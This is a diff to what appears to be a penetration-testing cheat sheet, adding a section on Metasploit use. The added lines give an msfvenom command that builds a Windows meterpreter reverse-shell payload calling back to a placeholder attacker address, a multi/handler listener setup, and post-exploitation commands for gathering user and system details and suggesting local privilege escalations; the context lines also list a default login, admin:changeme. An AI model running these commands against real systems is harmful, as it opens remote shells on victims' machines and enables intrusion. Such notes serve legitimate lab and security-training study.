@@ -52,3 +52,19 @@ mysql -u [USERNAME] -h [IP_ADDR] -p   # Connect to mysql server
 Default Credential 
 admin:changeme
 ```
+
+# Working with MSFVENOM and MSFCONSOLE
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [asp/aspx/php/filetype] > [OUTPUT_FILE.asp/aspx/php/filetype]
+
+msfconsole:
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp   # payload match with the one used in venom
+run     # start listener
+
+meterpreter session:
+getuid     # get current user session
+sysinfo    # get information of the remote system
+background / ctrl+z
+run post/multi/recon/local_exploit_suggester    # set session number
+```
